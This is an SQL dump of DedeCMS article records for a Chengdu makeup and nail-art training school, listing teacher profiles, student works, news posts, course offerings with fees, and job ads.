INSERT INTO dede_archives VALUES ('25', '21', '0', '1428993876', 'p', '0', '18', '-1', '198', '0', '作品3', '', '', 'admin', '未知', '/uploads/150411/1-1504111P6363W.png', '1428993876', '1428993887', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '24');
INSERT INTO dede_archives VALUES ('46', '11', '0', '1429151241', 'p', '1', '22', '0', '200', '0', '55', '', '', 'admin', '未知', '/uploads/150416/1-150416102631609.png', '1429151241', '1429151256', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '38');
INSERT INTO dede_archives VALUES ('47', '11', '0', '1429151513', 'p', '1', '22', '0', '145', '0', '成都群丽化妆学校2014荣获3A等级', '', '', 'admin', '未知', '/uploads/150416/1-150416103213622.jpg', '1429151513', '1429151430', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '39');
INSERT INTO dede_archives VALUES ('48', '11', '0', '1429151617', 'p', '1', '22', '0', '50', '0', '5645', '', '', 'admin', '未知', '/uploads/150416/1-15041610312aA.jpg', '1429151617', '1429151496', '1', '', '0', '0', '0', '0', '0', '0', '4343434', '', '1', '0', '0', '40');
INSERT INTO dede_archives VALUES ('49', '36', '0', '1429246774', 'p', '1', '18', '0', '159', '0', '叶丽老师', '', '', '张老师', '档案库', '/uploads/150417/1-15041G3000W31.jpg', '1429246774', '1429152357', '1', '成都化妆老师,高级,彩妆,讲师,', '0', '0', '0', '0', '0', '0', '简介：高级彩妆讲师 2001年-2010群丽婚纱摄影设计部高级造型化妆师 2010年群丽婚纱摄影学校高级讲师 曾担任： 06年新潮2周年超女冯家妹指定化妆造型师 girl杂志模特化妆造型指导老师', '', '1', '0', '0', '41');
INSERT INTO dede_archives VALUES ('51', '18', '0', '1429152768', 'c,h,p', '1', '1', '0', '137', '0', '唇妆天天换花样 总有一款适合你', '', '', 'admin', '未知', '/uploads/allimg/150416/1-150416105401424-lp.jpg', '1429152768', '1429152900', '1', '唇妆,天天,换,花样,总有,一款,适合,你,撞色,', '0', '0', '0', '0', '0', '0', '唇妆天天换花样', '', '1', '0', '0', '42');
INSERT INTO dede_archives VALUES ('52', '22', '0', '1429256668', 'c,h,p', '1', '19', '0', '111', '0', '199期学员刘静【唯视觉】化妆执行总监', '199期学员刘静', '', 'admin', '未知', '/uploads/150417/1-15041G60222M5.png', '1429256668', '1429154505', '1', '199期,学员,刘静,现任,【,唯,视觉,】,化妆,', '0', '0', '0', '0', '0', '0', '三个月前，带着懵懂踏入群丽，对这个新奇的环境充满了好奇与期待，渴望能在这里通过学习，磨练自己，提成自己的能力，不断刷新对自己的认识，在这三个月里我结交了许多朋友，', '', '1', '0', '0', '44');
INSERT INTO dede_archives VALUES ('57', '17', '0', '1429258454', 'p', '1', '1', '0', '169', '0', '成都航空公司联合群丽化妆学校举办职员妆面培', '', '', 'admin', '未知', '/uploads/150414/1-150414145301504.png', '1429258454', '1429155308', '1', '航空乘务人员   群丽化妆', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '49');
INSERT INTO dede_archives VALUES ('58', '22', '0', '1429260292', 'p', '1', '19', '0', '117', '0', '群丽学校化妆美甲学员【廖雪梅】创业明星', '学员【廖雪梅】', '', 'admin', '未知', '/uploads/150417/1-15041G6421BT.png', '1429260292', '1429155796', '1', '群丽,学校,化妆,美甲,学员,【,廖雪梅,廖,雪梅,', '0', '0', '0', '0', '0', '0', '姓名：廖雪梅 毕业学校： 群丽摄影和形象设计职业技能培训学校 毕业年度、班级：2013年6月 班主任：小雪 性格：活泼、开朗、执着、独立 爱好：绘画、看书、看电影、关实时资讯 座', '', '1', '0', '0', '50');
INSERT INTO dede_archives VALUES ('59', '33', '0', '1430812278', 'p', '1', '18', '0', '56', '0', '凯丽老师', '', '', '张老师', '档案库', '/uploads/150417/1-15041G25I5Y7.jpg', '1430812278', '1429155991', '1', '高级,设计师,高级,设计师,', '0', '0', '0', '0', '0', '0', '高级化妆讲师 所获荣誉： 高级化妆造型师 高级化妆讲师 高级造型讲师 中国群丽化妆培训高级讲师 参与活动： 亨得利钟表眼镜有限公司化妆形象培训指导 第51届国际小姐大赛总决赛化', '', '1', '0', '0', '5');
INSERT INTO dede_archives VALUES ('60', '33', '0', '1430812163', 'p', '1', '18', '0', '155', '0', '小雪老师', '小雪老师', '', '张老师', '档案库', '/uploads/150417/1-15041G24R3309.jpg', '1430812163', '1429156160', '1', '高级,设计师,高级,设计师,', '0', '0', '0', '0', '0', '0', '高级化妆讲师小雪老师 所获荣誉： 高级化妆师 高级化妆讲师 高级造型讲师 劳动部国家级评委 国家劳动部高级化妆师 日本JMA化妆师鉴定机构授权高级化妆讲师                              ', '', '1', '0', '0', '3');
INSERT INTO dede_archives VALUES ('61', '22', '0', '1429259722', 'p', '1', '19', '0', '180', '0', '群丽学校美甲学员【李静】创业明星', '创业明星', '', 'admin', '未知', '/uploads/150417/1-15041G6340b27.png', '1429259722', '1429156366', '1', '群丽,学校,美甲,学员,【,李静,】,创业,明星,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '53');
INSERT INTO dede_archives VALUES ('62', '34', '0', '1429246579', 'c,h,p', '1', '18', '0', '138', '0', '郭老师', '', '', 'admin', '未知', '/uploads/150417/1-15041G15234308.png', '1429246579', '1429156455', '1', '高级,设计师,高级,设计师,', '0', '0', '0', '0', '0', '0', '高级彩妆讲师 2001年-2010群丽婚纱摄影设计部高级造型化妆师 2010年群丽婚纱摄影学校高级讲师 曾担任： 06年新潮2周年超女冯家妹指定化妆造型师 girl杂志模特化妆造型指导老师', '', '1', '0', '0', '54');
INSERT INTO dede_archives VALUES ('63', '35', '0', '1430812215', 'p', '1', '18', '0', '192', '0', '美甲高老师', '', '', 'admin', '未知', '/uploads/150416/1-150416133305447.png', '1430812215', '1429156576', '1', '美甲,专业,教师,美甲,专业,教师,', '0', '0', '0', '0', '0', '0', '高级美甲专业讲师 高老师 具有丰富的授课经验和课程编排能力，课程安排丰富实用，教学风格大气稳重，寓教于乐，深受学员的喜爱。其主讲的美甲店营销管理、促销策划具有极强的', '', '1', '0', '0', '2');
INSERT INTO dede_archives VALUES ('64', '36', '0', '1430812240', 'p', '1', '18', '0', '52', '0', '杜老师', '', '', 'admin', '未知', '/uploads/150417/1-15041G11452405.jpg', '1430812240', '1429156803', '1', '高级化妆讲师杜老师', '0', '0', '0', '0', '0', '0', '荣获：台湾第九届华容杯彩妆大赏赛国际组创意组金奖、中国美发美容协会会员、中国电影电视技术协会会员、中国高级化妆造型师', '', '1', '0', '0', '4');
INSERT INTO dede_archives VALUES ('69', '16', '0', '1429262849', 'p', '1', '1', '0', '173', '0', '《全城热恋，爱在绿洲》大型婚纱秀模特化妆造', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G14409291-lp.jpg', '1429262849', '1429242894', '1', '群丽化妆造型', '0', '0', '0', '0', '0', '0', '成都群丽化妆学校\r\n地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '61');
INSERT INTO dede_archives VALUES ('65', '21', '0', '1429249636', 'p', '1', '20', '0', '175', '0', '作品1', '', '', 'admin', '未知', '/uploads/150417/1-15041G40I5F8.png', '1429249636', '1429157160', '1', '作品,作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '57');
INSERT INTO dede_archives VALUES ('66', '21', '0', '1429248284', 'p', '1', '20', '0', '87', '0', '作品2', '', '', 'admin', '未知', '/uploads/150416/1-150416133305447.png', '1429248284', '1429162394', '1', '作品,震,', '0', '0', '0', '0', '0', '0', '震', '', '1', '0', '0', '58');
INSERT INTO dede_archives VALUES ('68', '40', '0', '1429253788', '', '1', '1', '0', '124', '0', '招聘前台接待', '', '', '人事部', '未知', '', '1429253788', '1429164818', '1', '招聘,部门主管,招聘,部门主管,', '0', '0', '0', '0', '0', '0', '职位描述： 1、负责接待家长咨询，解答家长疑问； 2、完成家长报班、调班、退费及转班的相关系统操作； 3、完成各类讲义随材的收集、整理、立卷、装订、归档等保管工作； 4、检', '', '1', '0', '0', '60');
INSERT INTO dede_archives VALUES ('70', '16', '0', '1429246487', 'p', '1', '1', '0', '182', '0', '　　群丽化妆学校参与精功国际模特大赛化妆活', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G25243F4-lp.jpg', '1429246487', '1429246407', '1', '群丽,化妆,学校,参与,精功,国际,模特大赛,活,', '0', '0', '0', '0', '0', '0', '成都群丽化妆学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼 电话：028-86661825 电话：028-86661640', '', '1', '0', '0', '62');
INSERT INTO dede_archives VALUES ('71', '16', '0', '1429258143', 'p', '1', '1', '0', '229', '0', '朱丹、小P老师来蓉，群丽化妆学校倾情助阵', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G3033Y53-lp.jpg', '1429258143', '1429247560', '1', '朱丹,、,小,老师,来,蓉,群丽,化妆,学校,倾情,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '63');
INSERT INTO dede_archives VALUES ('72', '16', '0', '1429248327', 'p', '1', '1', '0', '157', '0', '亨得利特邀群丽化妆讲师为其员工进行专业彩妆', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G32151191-lp.jpg', '1429248327', '1429248289', '1', '亨得利,特邀,群丽,化妆,讲师,为,其,员工,进行,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '64');
INSERT INTO dede_archives VALUES ('73', '16', '0', '1429257988', 'p', '1', '1', '0', '186', '0', '200期学员毕业留影', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G34K1443-lp.jpg', '1429257988', '1429249721', '1', '200期,学员,毕业,今天,是,200期,化妆,学员,毕业,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '65');
INSERT INTO dede_archives VALUES ('74', '16', '0', '1429257542', 'p', '1', '1', '0', '140', '0', '201期毕业学员留影', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G4001W16-lp.jpg', '1429257542', '1429250478', '1', '201期,毕业,学员,留影,绿树成荫,万物,蓬生,。,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '66');
INSERT INTO dede_archives VALUES ('75', '21', '0', '1429250961', 'p', '1', '20', '0', '81', '0', '178期优秀学员赵媛作品', '', '', 'admin', '未知', '/uploads/150417/1-15041G40952618.png', '1429250961', '1429251056', '1', '178期,优秀,学员,赵媛,作品,178期,优秀,学员,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '67');
INSERT INTO dede_archives VALUES ('76', '21', '0', '1429251080', 'p', '1', '20', '0', '51', '0', '学员作品4', '', '', 'admin', '未知', '/uploads/150417/1-15041G41144916.png', '1429251080', '1429251114', '1', '学员,作品,学员,作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '68');
INSERT INTO dede_archives VALUES ('77', '21', '0', '1429251116', 'p', '1', '20', '0', '88', '0', '学生作品5', '', '', 'admin', '未知', '/uploads/150417/1-15041G4121A94.png', '1429251116', '1429251146', '1', '学生作品,学生作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '69');
INSERT INTO dede_archives VALUES ('78', '21', '0', '1432454252', 'p', '1', '20', '0', '53', '0', '学生作品6', '', '', 'admin', '未知', '/uploads/150524/1-150524155PE43.jpg', '1432454252', '1429251187', '1', '学生作品,学生作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '70');
INSERT INTO dede_archives VALUES ('79', '21', '0', '1432454181', 'p', '1', '20', '0', '168', '0', '学生作品7', '', '', 'admin', '未知', '/uploads/150524/1-15052415564EE.jpg', '1432454181', '1429251212', '1', '学生作品,学生作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '71');
INSERT INTO dede_archives VALUES ('80', '21', '0', '1429251215', 'p', '1', '20', '0', '71', '0', '学生作品8', '', '', 'admin', '未知', '/uploads/150417/1-15041G41355928.png', '1429251215', '1429251241', '1', '学生作品,学生作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '72');
INSERT INTO dede_archives VALUES ('81', '17', '0', '1429258042', 'p', '1', '1', '0', '134', '0', '韩国性感天后蔡妍（이채연이채연）现身于成都', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G43554215-lp.jpg', '1429258042', '1429253254', '1', '韩国,性感,天后,蔡妍,이채,연이,채연,现身,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '73');
INSERT INTO dede_archives VALUES ('82', '17', '0', '1432092225', 'p', '1', '1', '0', '197', '0', '群丽化妆4月火爆招生', '', '', '张老师', '群丽学校', '/uploads/150520/1-150520110R35W.jpg', '1432092225', '1429253798', '1', '群丽,化妆,4月,火爆,招生,群里,化妆,学校,', '0', '0', '0', '0', '0', '0', '地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-8666 1825\r\n电话：028-8666 1640', '', '1', '0', '0', '74');
INSERT INTO dede_archives VALUES ('85', '18', '0', '1429258826', 'p', '1', '1', '0', '193', '0', '晚睡的危害', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G61911M7-lp.jpg', '1429258826', '1429258813', '1', '晚睡,的,危害,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '77');
INSERT INTO dede_archives VALUES ('86', '18', '0', '1429260383', 'p', '1', '1', '0', '122', '0', '学化妆是去影楼还是专业的化妆学校？', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G6410O20-lp.jpg', '1429260383', '1429260165', '1', '学,化妆,是,去,影楼,还是,专业,的,学校,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '78');
INSERT INTO dede_archives VALUES ('87', '18', '0', '1429260637', 'p', '1', '1', '0', '56', '0', '中国成韩国最大化妆品出口国', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041G64923155-lp.jpg', '1429260637', '1429260626', '1', '中国,成,韩国,最大,化妆品,出口国,15日,韩国,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '79');
INSERT INTO dede_archives VALUES ('88', '22', '0', '1429260410', 'p', '1', '19', '0', '134', '0', '【夏颖】36期优秀学员', '', '', 'admin', '未知', '/uploads/150417/1-15041G64952X3.png', '1429260410', '1429260774', '1', '成都化妆培训学员', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '42');
INSERT INTO dede_archives VALUES ('89', '22', '0', '1429260812', 'p', '1', '19', '0', '117', '0', '【母瑾】157期优秀学员', '', '', 'admin', '未知', '/uploads/150417/1-15041GA511T9.png', '1429260812', '1429260998', '1', '【,母瑾,】,157期,优秀,学员,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '81');
INSERT INTO dede_archives VALUES ('90', '18', '0', '1429260668', 'p', '1', '1', '0', '61', '0', '五招教你辨别化妆品真伪', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041GAG4192-lp.jpg', '1429260668', '1429261332', '1', '五招,教你,辨别,化妆品,真伪,随着,社,会的,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '80');
INSERT INTO dede_archives VALUES ('91', '18', '0', '1429262527', 'p', '1', '1', '0', '63', '0', '青春痘真是那么烦人吗？', '', '', 'admin', '未知', '/uploads/allimg/150417/1-15041GG0095L-lp.jpg', '1429262527', '1429262318', '1', '青春痘,真是,那么,烦人,吗,再不,疯狂,我们,就,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '83');
INSERT INTO dede_archives VALUES ('92', '12', '0', '1432464010', 'p', '1', '17', '0', '123', '0', '时尚彩妆研修班', '', '', 'admin', '未知', '/uploads/150514/150514/1-15051416455Y06.jpg', '1432464010', '1429327777', '1', '时尚,彩妆,研修班,招生,对象,主要,培训,为有,', '0', '0', '0', '0', '0', '0', '让您成为一名具备全面综合能力的造型师。', '', '1', '0', '0', '84');
INSERT INTO dede_archives VALUES ('93', '13', '0', '1432182764', 'p,s', '1', '17', '0', '115', '0', '美甲专业班', '', '', '张老师', '课程组', '/uploads/150514/1-150514162HY29.jpg', '1432182764', '1429328847', '1', '美容,创业,培训班,美容,创业,培训班,', '0', '0', '0', '0', '0', '0', '实体店体验学习，真正的带薪培训，100%就业。\r\n学员入学，即可有机会成为群丽香觉SPA会馆的员工，签约合同即可带薪培训。\r\n教学模式：理论+实操练习+实体店体验学习。\r\n就业保证：', '', '1', '0', '0', '85');
INSERT INTO dede_archives VALUES ('94', '14', '0', '1432183528', 'p', '1', '17', '0', '111', '0', '美睫', '', '', 'admin', '未知', '/uploads/150514/1-150514163415643.jpg', '1432183528', '1429329042', '1', '美甲,特色,阶段,授课,每周,新课,一对一,', '0', '0', '0', '0', '0', '0', '招生对象  针对无美甲基础，到专业从事此行业、及美甲爱好者', '', '1', '0', '0', '86');
INSERT INTO dede_archives VALUES ('95', '15', '0', '1432183761', 'p,s', '1', '17', '0', '173', '0', '个人化妆周末班', '', '', '张老师', '课程组', '/uploads/150514/1-150514162910637.jpg', '1432183761', '1429329845', '1', '整体,造型,全,科班,教学,目的,有,无基础,学员,', '0', '0', '0', '0', '0', '0', '整体造型全科班', '', '1', '0', '0', '87');
INSERT INTO dede_archives VALUES ('96', '23', '0', '1432018549', 'p', '1', '21', '0', '124', '0', '专业美甲开班信息', '美甲开班信息。', '', 'admin', '未知', '/uploads/150418/1-15041Q20ZB17.jpg', '1432018549', '1429330284', '1', '美甲开班信息', '0', '0', '0', '0', '0', '0', '美甲开班信息', '', '1', '0', '0', '88');
INSERT INTO dede_archives VALUES ('98', '18', '0', '1429334886', 'p', '1', '1', '0', '140', '0', '化妆品真能放冰箱吗？', '', '', 'admin', '未知', '/uploads/allimg/150418/1-15041Q329592L-lp.png', '1429334886', '1429335327', '1', '化妆品,真,能放,冰箱,吗,说道,放,冰箱,保鲜,', '0', '0', '0', '0', '0', '0', '群丽化妆摄影学校地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼\r\n电话：028-86661825\r\n电话：028-86661640', '', '1', '0', '0', '90');
INSERT INTO dede_archives VALUES ('99', '40', '0', '1429495111', 'c,h', '1', '1', '0', '23', '0', '武侯美姿美甲沙龙招聘', '美甲师招聘', '', 'admin', '未知', '', '1429495111', '1429495285', '1', '武侯,美姿,美甲,沙龙,招聘,一,、,应聘,要求,', '0', '0', '0', '0', '0', '0', '一、应聘要求：\r\n1．女性；\r\n2．成熟的从业经验，（有专业证书者优先考虑）；美甲会常用技术（光疗水晶的延长，雕花，绘画功底. 精通基础美甲-涂甲油胶', '', '1', '0', '0', '91');
INSERT INTO dede_archives VALUES ('100', '12', '0', '1432535942', 'p', '1', '17', '0', '194', '0', '1个月课程介绍', '1 month course introduction', '', '杨老师', '未知', '/uploads/150514/1-150514162605545.jpg', '1432535942', '1429690863', '1', '一个月,课程,介绍,学期,1个月,专业,形象,', '0', '0', '0', '0', '0', '0', '学期：1个月 专业形象设计培训基础班 上课时间:周一至周五 AM 10：00-12：00 PM 1：00-17：00 ', '', '1', '0', '0', '92');
INSERT INTO dede_archives VALUES ('102', '12', '0', '1432535976', 'p', '1', '17', '0', '199', '0', '2个月 专业形象设计师培训基础班', '2 month professional image designer', '', 'admin', '未知', '/uploads/150514/1-150514162534496.jpg', '1432535976', '1429692024', '1', '专业,形象,设计师,培训,基础,班,2个月,上课,', '0', '0', '0', '0', '0', '0', '上课时间:周一至周五 AM 10：00-12：00 PM 1：00-17：00 教学目的： 有无基础学员都可选学，了解化妆的起源与发展，掌握基础化妆理论、认识化妆工具及化妆品种类，学习各种脸型、眉形、', '', '1', '0', '0', '94');
INSERT INTO dede_archives VALUES ('101', '15', '0', '1432183776', 'p,s', '1', '17', '0', '137', '0', '个人化妆VIP班', '', '', 'admin', '未知', '/uploads/150514/1-150514162T0126.jpg', '1432183776', '1429690913', '1', '个人,化妆,VIP,班,学时,课时,学费,1980元,活动,', '0', '0', '0', '0', '0', '0', '学时：15课时学费1980元（活动价1480元） 附:(须提前预约） 专业讲师全程一对一教学手把手辅导，针对个人量身打造专属彩妆造型 学习内容： 一个人色彩诊断 二化妆品、化妆工具认识', '', '1', '0', '0', '92');
INSERT INTO dede_archives VALUES ('103', '12', '0', '1432522865', 'p', '1', '17', '0', '123', '0', '3个月 专业形象设计师培训基础班', '', '', '杨老师', '未知', '/uploads/150514/1-15051416244S45.jpg', '1432522865', '1429692564', '1', '3个月,专业,形象,设计师,培训,基础,班,上课,', '0', '0', '0', '0', '0', '0', '上课时间:周一至周五 AM 10：00-12：00 PM 1：00-17：00 \r\n教学目的： 有无基础学员都可选学，让学员了解日韩欧美流行时尚元素.', '', '1', '0', '0', '95');
INSERT INTO dede_archives VALUES ('104', '12', '0', '1432522075', 'p', '1', '17', '0', '187', '0', '4个月 专业形象设计师培训研修班', '', '', '杨老师', '未知', '/uploads/150514/1-15051416240SK.jpg', '1432522075', '1429693053', '1', '4个月,专业,形象,设计师,培训,研修班,上课,', '0', '0', '0', '0', '0', '0', '教学目的：有无基础学员都可选学，让学员了解日韩欧美流行时尚元素 课程以理论和实践相结合，注重学员的实际操作，培养实用性强，复合型高端化妆人才。', '', '1', '0', '0', '96');
INSERT INTO dede_archives VALUES ('105', '12', '0', '1432521522', 'p', '1', '17', '0', '118', '0', '5个月 专业形象设计师培训研修班', '', '', '杨老师', '未知', '/uploads/150514/1-150514162314443.jpg', '1432521522', '1429693732', '1', '5个月,专业,形象,设计师,培训,研修班,上课,', '0', '0', '0', '0', '0', '0', '上课时间:周一至周五 AM 10：00-12：00 PM 1：00-17：00 ', '', '1', '0', '0', '97');
INSERT INTO dede_archives VALUES ('106', '13', '0', '1432180368', 'h,p,f', '1', '17', '0', '139', '0', '美甲创业班', '', '', '张老师', '未知', '/uploads/150514/1-150514162212c4.jpg', '1432180368', '1429694390', '1', '成都美甲学校,成都学美甲,成都学美甲多少钱', '0', '0', '0', '0', '0', '0', '美甲创业班 学期:2个半月学费:原价：7940元优惠价：3980元 上课时间：周一至周五 招生对象：美甲爱好者，创业开店人士，有无美甲基础均可学习 教学目的：主要教授现在美甲行业最实', '', '1', '0', '0', '97');
INSERT INTO dede_archives VALUES ('107', '13', '0', '1432184469', 'h,p', '1', '17', '0', '144', '0', '尖端化妆、美甲精英班', '', '', 'admin', '未知', '/uploads/150514/1-150514162131910.jpg', '1432184469', '1429694807', '1', '成都美甲学校,成都学美甲,成都美甲学校哪家好', '0', '0', '0', '0', '0', '0', '尖端化妆、美甲精英班 课程内容：基础化妆+影楼化妆+时尚创意妆+礼服搭配+基础美甲+尖端美甲+美甲店面营销管理课程 学期：4个半月学费：原价：8780元优惠价：6160元 （赠送化妆、美', '', '1', '0', '0', '99');
INSERT INTO dede_archives VALUES ('108', '23', '0', '1432018535', 'p,s', '1', '21', '0', '59', '0', '创业美甲班', '创业美甲', '', 'admin', '未知', '/uploads/150422/1-1504221HG54V.jpg', '1432018535', '1429842378', '1', '创业,美,甲班,美甲,创业,班,学期,2个,半月,', '0', '0', '0', '0', '0', '0', '美甲创业班 学期:2个半月学费:原价：7940元优惠价：3980元 上课时间：周一至周五 招生对象：美甲爱好者，创业开店人士， 有无美甲基础均可学习', '', '1', '0', '0', '95');
INSERT INTO dede_archives VALUES ('109', '23', '0', '1432018294', 'p,s', '1', '21', '0', '162', '0', '尖端化妆、美甲精英班', '', '', 'admin', '未知', '/uploads/150422/1-1504221H541405.jpg', '1432018294', '1429842490', '1', '尖端,化妆,、,美甲,精英,班,尖端,化妆,、,', '0', '0', '0', '0', '0', '0', '尖端化妆、美甲精英班 课程内容：基础化妆+影楼化妆+时尚创意妆+礼服搭配+基础美甲+尖端美甲+美甲店面营销管理课程 学期：4个半月学费：原价：8780元优惠价：6160元 （赠送化妆、美', '', '1', '0', '0', '98');
INSERT INTO dede_archives VALUES ('110', '16', '0', '1430808332', 'p', '1', '1', '0', '185', '0', '群丽新学员学习现场', '', '', 'admin', '未知', '/uploads/allimg/150428/1-15042Q51G1203-lp.jpg', '1430808332', '1430206007', '1', '群丽化妆造型', '0', '0', '0', '0', '0', '0', '群丽化妆造型', '', '1', '0', '0', '102');
INSERT INTO dede_archives VALUES ('111', '16', '0', '1430728751', 'p', '1', '1', '0', '98', '0', '群丽携手百盛特约商户签约大型仪式', '', '', '杨老师', '未知', '/uploads/allimg/150504/1-15050412550JC-lp.png', '1430728751', '1430715728', '1', '群丽化妆，百盛集团，签约', '0', '0', '0', '0', '0', '0', '群丽化妆学校', '', '1', '0', '0', '103');
INSERT INTO dede_archives VALUES ('112', '34', '0', '1430811076', 'c,p', '1', '18', '0', '187', '0', '张老师', '', '', 'admin', '未知', '/uploads/150505/1-1505051521232G.jpg', '1430811076', '1430810611', '1', '张老师,张,老师,高级,彩妆,讲师,2001年,-2010群', '0', '0', '0', '0', '0', '0', '高级彩妆讲师 2001年-2010群丽婚纱摄影设计部高级造型化妆师 2010年群丽婚纱摄影学校高级讲师 曾担任： 06年新潮2周年超女冯家妹指定化妆造型师 girl杂志模特化妆造型指导老师 2001年', '', '1', '0', '0', '104');
INSERT INTO dede_archives VALUES ('113', '34', '0', '1430811562', 'p', '1', '18', '0', '154', '0', '舒老师', '', '', 'admin', '未知', '/uploads/150505/1-15050515395E23.jpg', '1430811562', '1430811844', '1', '舒老师,舒,老师,girl,杂志,模特,化妆造型,指导,', '0', '0', '0', '0', '0', '0', 'girl杂志模特化妆造型指导老师 成飞公司年会活动化妆总监 成都华为集团公司员工形象设计 精功模特大赛活动评委 2010年宝马汽车年会活动化妆总监 新潮杂志美丽课堂主讲讲师 成都电', '', '1', '0', '0', '105');
INSERT INTO dede_archives VALUES ('114', '34', '0', '1430811894', 'p', '1', '18', '0', '55', '0', '杨老师', '', '', 'admin', '未知', '/uploads/150505/1-15050515451V91.jpg', '1430811894', '1430811941', '1', '杨老师,杨,老师,girl,杂志,模特,化妆造型,指导,', '0', '0', '0', '0', '0', '0', 'girl杂志模特化妆造型指导老师 成飞公司年会活动化妆总监 成都华为集团公司员工形象设计 精功模特大赛活动评委 2010年宝马汽车年会活动化妆总监 新潮杂志美丽课堂主讲讲师 成都电', '', '1', '0', '0', '106');
INSERT INTO dede_archives VALUES ('115', '34', '0', '1430811944', 'p', '1', '18', '0', '148', '0', '李老师', '', '', 'admin', '未知', '/uploads/150505/1-1505051546222V.jpg', '1430811944', '1430812105', '1', '李老师,李,老师,girl,杂志,模特,化妆造型,指导,', '0', '0', '0', '0', '0', '0', 'girl杂志模特化妆造型指导老师 成飞公司年会活动化妆总监 成都华为集团公司员工形象设计 精功模特大赛活动评委 2010年宝马汽车年会活动化妆总监 新潮杂志美丽课堂主讲讲师 成都电', '', '1', '0', '0', '107');
INSERT INTO dede_archives VALUES ('116', '21', '0', '1430976906', 'c,p', '1', '20', '0', '95', '0', '210期学员作品', '', '', 'admin', '未知', '/uploads/150507/1-15050G33600Z1.jpg', '1430976906', '1430976970', '1', '210期,学员,作品,210期,学员,作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '108');
INSERT INTO dede_archives VALUES ('117', '21', '0', '1432453741', 'c,p', '1', '20', '0', '113', '0', '205期学员作品', '', '', 'admin', '未知', '/uploads/150524/1-15052415492E47.jpg', '1432453741', '1430977056', '1', '205期,学员,作品,205期,学员,作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '109');
INSERT INTO dede_archives VALUES ('118', '21', '0', '1432453892', 'p', '1', '20', '0', '111', '0', '203期学员作品', '', '', 'admin', '未知', '/uploads/150524/1-150524155211E4.jpg', '1432453892', '1430977116', '1', '203期,学员,作品,203期,学员,作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '110');
INSERT INTO dede_archives VALUES ('119', '21', '0', '1432454588', 'p', '1', '20', '0', '153', '0', '205期学员作品', '', '', 'admin', '未知', '/uploads/150524/1-150524160335515.jpg', '1432454588', '1430977144', '1', '205期,学员,作品,205期,学员,作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '111');
